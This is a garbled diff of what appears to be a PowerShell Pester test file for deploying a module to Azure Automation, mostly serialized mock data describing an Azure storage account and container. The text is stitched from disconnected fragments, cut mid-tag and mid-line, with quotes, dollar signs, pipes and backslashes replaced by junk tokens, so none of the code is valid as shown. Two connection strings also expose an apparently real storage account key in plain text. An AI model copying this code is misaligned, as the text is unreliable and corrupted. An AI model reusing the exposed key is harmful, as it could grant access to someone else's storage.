+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+     ','uld get an Automation account5hF {
+','=K5PPreventEncryptionScopeOverrideK5P>false</B>
+            <S N=K5PETagK5P>K5P0x8D7F039D3D0C5C5K5P</S>
+            <Obj N=K5PMetadataK5P RefId=K5P9K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PContextK5P RefId=K5P10K5P>
+            <TN RefId=K5P9K5P>
+            <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+            <T>Syste','B N=K5PIsServerEncryptedK5P>true</B>
+            <Nil N=K5PEncryptionKeySha256K5P />
+            <Nil N=K5PEncryptionScopeK5P />
+            <S N=K5PAccessTierK5P>Hot</S>
+            <B N=K5PAccessTierInferredK5P>true</B>
+            <Nil N=K5PArchiveStatusK5P />
+            <S N=K5PAccessTierChangedOnK5P>01/01/0001 00:00:00 +00:00</S>
+            </Props>
+        </Obj>
+        <Nil N=K5PRemainingDaysBeforePermanentDeleteK5P />
+        <S N=K5PContentTypeK5P>application/octet-stream</S>
+        <Obj N=K5PLastModifiedK5P RefId=K5P7K5P>
+            <TN RefId=K5P6K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/12/2020 11:22:11 +00:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-12T11:22:11</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-12T11:22:11Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-12T14:22:11+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-12T00:00:00</DT>
+            <I32 N=K5PDayK5P>12</I32>
+            <S N=K5PDayOfWeekK5P>Tuesday</S>
+            <I32 N=K5PDayOfYearK5P>133</I32>
+            <I32 N=K5PHourK5P>11</I32>
+            <I32 N=K5PMillisecondK5P>0</I32>
+            <I32 N=K5PMinuteK5P>22</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT0S</TS>
+            <I32 N=K5PSecondK5P>11</I32>
+            <I64 N=K5PTicksK5P>637248793310000000</I64>
+            <I64 N=K5PUtcTicksK5P>637248793310000000</I64>
+            <TS N=K5PTimeOfDayK5P>PT11H22M11S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PSnapshotTimeK5P />
+        <Nil N=K5PContinuationTokenK5P />
+        <Obj N=K5PContextK5P RefId=K5P8K5P>
+            <TN RefId=K5P7K5P>
+            <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+       ','.Private.CoreLib, Version=4.0.0.0, Cultur','/aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PQueueK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PTableK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PFileK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <S N=K5PWebK5P>https://aadeploymentstor.z6.web.core.windows.net/</S>
+            <S N=K5PDfsK5P>https://aadeploymentstor.dfs.core.windows.net/</S>
+            <Nil N=K5PMicrosoftEndpointsK5P />
+            <Nil N=K5PInternetEndpointsK5P />
+            </Props>
+        </Obj>
+        <S N=K5PPrimaryLocationK5P>westeurope</S>
+        <Obj N=K5PProvisioningStateK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.ProvisioningState</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Succeeded</ToString>
+            <I32>2</I32>
+        </Obj>
+        <Nil N=K5PSecondaryEndpointsK5P />
+        <Nil N=K5PSecondaryLocationK5P />
+        <Obj N=K5PStatusOfPrimaryK5P RefId=K5P6K5P>
+            <TN RefId=K5P6K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.AccountStatus</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Available</ToString>
+            <I32>0</I32>
+        </Obj>
+        <Nil N=K5PStatusOfSecondaryK5P />
+        <Obj N=K5PTagsK5P RefId=K5P7K5P>
+            <TN RefId=K5P7K5P>
+            <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+            <T>System.Object</T>
+            </TN>
+            <DCT>
+            <En>
+                <S N=K5PKeyK5P>environment</S>
+                <S N=K5PValueK5P>Test</S>
+            </En>
+            </DCT>
+        </Obj>
+        <B N=K5PEnableHttpsTrafficOnlyK5P>true</B>
+        <Nil N=K5PAzureFilesIdentityBasedAuthK5P />
+        <Nil N=K5PEnableHierarchicalName','         <I64 N=K5PTicksK5P>637248793310000000</I64>
+            <I64 N=K5PUtcTicksK5P>637248793310000000</I64>
+            <TS N=K5PTimeOfDayK5P>PT11H22M11S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PSnapshotTimeK5P />
+        <Nil N=K5PContinuationTokenK5P />
+        <Obj N=K5PContextK5P RefId=K5P8K5P>
+            <TN RefId=K5P7K5P>
+            <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P8K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aa','ount -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould query the Automation account for already imported module5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzAutomationModule -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould import the module into Automation account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+          ',' N=K5PMinuteK5P>42</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>32</I32>
+            <I64 N=K5PTicksK5P>637242109526170000</I64>
+            <I64 N=K5PUtcTicksK5P>637242001526170000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H42M32.617S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>05/12/2020 14:05:27 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-12T14:05:27.527</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-12T11:05:27.527Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-12T14:05:27.527+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-12T00:00:00</DT>
+            <I32 N=K5PDayK5P>12</I32>
+            <S N=K5PDayOfWeekK5P>Tuesday</S>
+            <I32 N=K5PDayOfYearK5P>133</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>527</I32>
+            <I32 N=K5PMin','MinuteK5P>45</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT0S</TS>
+            <I32 N=K5PSecondK5P>45</I32>
+            <I64 N=K5PTicksK5P>637242003450000000</I64>
+            <I64 N=K5PUtcTicksK5P>637242003450000000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H45M45S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PContinuationTokenK5P />
+        <Obj N=K5PBlobContainerClientK5P RefId=K5P7K5P>
+            <TN RefId=K5P7K5P>
+            <T>Azure.Storag','            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.CloudBlobContainer</ToString>
+            <Props>
+            <S N=K5PServiceClientK5P>Microsoft.Azure.Storage.Blob.CloudBlobClient</S>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend5hF; Secondary = 5hF5hF</S>
+            <S N=K5PNameK5P>psdepend</S>
+            <Obj N=K5PMetadataK5P RefId=K5P2K5P>
+                <TN RefId=K5P2K5P>
+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            <S N=K5PPropertiesK5P>Microsoft.Azure.Storage.Blob.BlobContainerProperties</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PPermissionK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</ToString>
+            <Props>
+            <S N=K5PPublicAccessK5P>Container</S>
+            <Obj N=K5PSharedAccessPoliciesK5P RefId=K5P4K5P>
+                <TN RefId=K5P4K5P>
+                <T>Microsoft.Azure.Storage.Blob.SharedAccessBlobPolicies</T>
+                <T>System.Object</T>
+                </TN>
+                <IE />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PPublicAccessK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPublicAccessType</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Container</ToString>
+            <I32>1</I32>
+        </Obj>
+        <Obj N=K5PLastModifiedK5P RefId=K5P6K5P>
+            <TN RefId=K5P6K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 14:45:45 +00:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T14:45:45</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:45:45Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:45:45+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>0</I32>
+            <I32 N=K5PMinuteK5P>45</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT0S</TS>
+            <I32 N=K5PSecondK5P>45</I32>
+            <I64 N=K5PTicksK5P>637242003450000000</I64>
+            <I64 N=K5PUtcTicksK5P>637242003450000000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H45M45S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5P','5P2K5P>
+                <TN RefId=K5P2K5P>
+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            <S N=K5PPropertiesK5P>Microsoft.Azure.Storage.Blob.BlobContainerProperties</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PPermissionK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage','          <I64 N=K5PTicksK5P>637204704805700000</I64','020 11:22:11 +00:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-12T11:22:11</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-12T11:22:11Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-12T14:22:11+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-12T00:00:00</DT>
+            <I32 N=K5PDayK5P>12</I32>
+            <S N=K5PDayOfWeekK5P>Tuesday</S>
+            <I32 N=K5PDayOfYearK5P>133</I32>
+            <I32 N=K5PHourK5P>11</I32>
+            <I32 N=K5PMillisecondK5P>0</I32>
+            <I32 N=K5PMinuteK5P>22</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT0S</TS>
+            <I32 N=K5PSecondK5P>11</I32>
+   ','K5P4K5P>
+            <TN RefId=K5P4K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.Endpoints</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Management.Storage.Models.Endpoints</ToString>
+            <Props>
+            <S N=K5PBlobK5P>https:/','m.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P10K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=http','     E03data
+            }
+            Mock New-AzAutomationModule {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.Module</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.Module</ToString>
+        <Props>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AAName</S>
+        <S N=K5PNameK5P>PSDepend</S>
+        <B N=K5PIsGlobalK5P>false</B>
+        <S N=K5PVersionK5P>0.3.2</S>
+        <I64 N=K5PSizeInBytesK5P>71093</I64>
+        <I32 N=K5PActivityCountK5P>8</I32>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 17:42:32 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:42:32.617</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:42:32.617Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:42:32.617+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>617</I32>
+            <I32','RefId=K5P11K5P>
+            <TN RefId=K5P11K5P>
+            <T>Microsoft.WindowsAzure.Commands.Common.Storage.LazyAzureStorageContext</T>
+            <T>Microsoft.WindowsAzure.Commands.Common.Storage.AzureStorageContext</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.LazyAzureStorageContext</ToString>
+            <Props>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <Ref N=K5PContextK5P RefId=K5P11K5P />
+            <S N=K5PNameK5P>aadeploymentstor</S>
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploym','ndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P2K5P>
+                <TN RefId=K5P1K5P>
+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=K5PNameK5P></S>
+        <Obj N=K5PStorageAccountK5P RefId=K5P3K5P>
+            <TN RefId=K5P2K5P>
+            <T>Microsoft.Azure.Storage.CloudStorageAccount</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</ToString>
+            <Props>
+            <URI N=K5PBlobEndpointK5P>https://aadeploymentstor.blob.core.windows.net/</URI>
+            <URI N=K5PQueueEndpointK5P>https://aadeploymentstor.queue.core.windows.net/</URI>
+            <URI N=K5PTableEndpointK5P>https://aadeploymentstor.table.core.windows.net/</URI>
+            <URI N=K5PFileEndpointK5P>https://aadeploymentstor.file.core.windows.net/</URI>
+            <S N=K5PBlobStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PQueueStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.queue.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PTableStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.table.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PFileStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.file.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PCredentialsK5P>Microsoft.Azure.Storage.Auth.StorageCredentials</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PTableStorageAccountK5P RefId=K5P4K5P>
+        ','ctionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System','   Assert-MockCalled New-AzAutomationModule -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould use a Storage account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzStorageAccount -Exactly 1 -Scope It
+                    Assert-MockCalled Get-AzStorageContainer -Exactly 1 -Scope It
+                    Assert-MockCalled Get-AzStorageAccountKey -Exactly 1 -Scope It
+                    Assert-MockCalled New-AzStorageContainer -Exactly 0 -Scope It
+                    Assert-MockCalled New-AzStorageContext -Exactly 1 -Scope It
+                    Assert-MockCalled New-AzStorageBlobSASToken -Exactly 1 -Scope It
+                    Assert-MockCalled Set-AzStorageBlobContent -Exactly 1 -Scope It
+                }
+            }
+        }
+    }
+}
+','     </Obj>
+            <Obj N=K5PVirtualNetworkRulesK5P RefId=K5P10K5P>
+                <TN RefId=K5P10K5P>
+                <T>Microsoft.Azure.Commands.Management.Storage.Models.PSVirtualNetworkRule[]</T>
+                <T>System.Array</T>
+                <T>System.Object</T>
+                </TN>
+                <LST />
+            </Obj>
+            <S N=K5PBypassK5P>AzureServices</S>
+            <S N=K5PDefaultActionK5P>Allow</S>
+            </Props>
+        </Obj>
+        <Nil N=K5PGeoReplicationStatsK5P />
+        <Obj N=K5PContextK5P RefId=K5P11K5P>
+            <TN RefId=K5P11K5P>
+            <T>Microsoft.WindowsAzure.Commands.Common.Storage.LazyAzureStorageContext</T>
+            <T>Microsoft.WindowsAzure.Commands.Common.Storage.AzureStorageContext</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.LazyAzureStorageContext</ToString>
+            <Props>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <Ref N=K5PContextK5P RefId=K5P11K5P />
+            <S N=K5PNameK5P>aadeploymentstor</S>
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnection','>
+            <I64 N=K5PUtcTicksK5P>637204632805700000</I64>
+            <TS N=K5PTimeOfDayK5P>PT10H41M20.57S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PLastModifiedByK5P />
+        <Obj N=K5PTagsK5P RefId=K5P3K5P>
+            <TN RefId=K5P2K5P>
+            <T>System.Collections.Hashtable</T>
+            <T>System.Object</T>
+            </TN>
+            <DCT>
+            <En>
+                <S N=K5PKeyK5P>environment</S>
+                <S N=K5PValueK5P>Test</S>
+            </En>
+            </DCT>
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzAutomationModule {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.Module</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.Module</ToString>
+        <Props>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AANAme</S>
+        <S N=K5PNameK5P>PSDepend</S>
+        <B N=K5PIsGlobalK5P>false</B>
+        <S N=K5PVersionK5P>0.3.2</S>
+        <I64 N=K5PSizeInBytesK5P>71093</I64>
+        <I32 N=K5PActivityCountK5P>8</I32>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 17:42:32 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:42:32.617</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:42:32.617Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:42:32.617+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>617</I32>
+            <I32 N=K5PMinuteK5P>42</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>32</I32>
+            <I64 N=K5PTicksK5P>637242109526170000</I64>
+            <I64 N=K5PUtcTicksK5P>637242001526170000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H42M32.617S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+       ','s</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P11K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=','ip:215.104.35.1185hF )  LUKwrite-host
+            It K5Pshould define parametersK5P {
+                E03sutPath LUK Should Contain 5hFParam5hF
+            }
+
+            It K5Pshould contain Write-Verbose blocksK5P {
+                E03sutPath LUK Should Contain 5hFWrite-Verbose5hF
+            }
+
+            It K5Pshould be a valid PowerShell codeK5P {
+                E03psFile = Get-Content -Path E03sutPath -ErrorAction Stop
+                E03errors = E03null
+                E03null = [System.Management.Automation.PSParser]::Tokenize(E03psFile, [ref]E03errors)
+                E03errors.Count LUK Should Be 0
+            }
+        }
+
+        Context K5PHelp QualityK5P {
+
+            # Getting function help
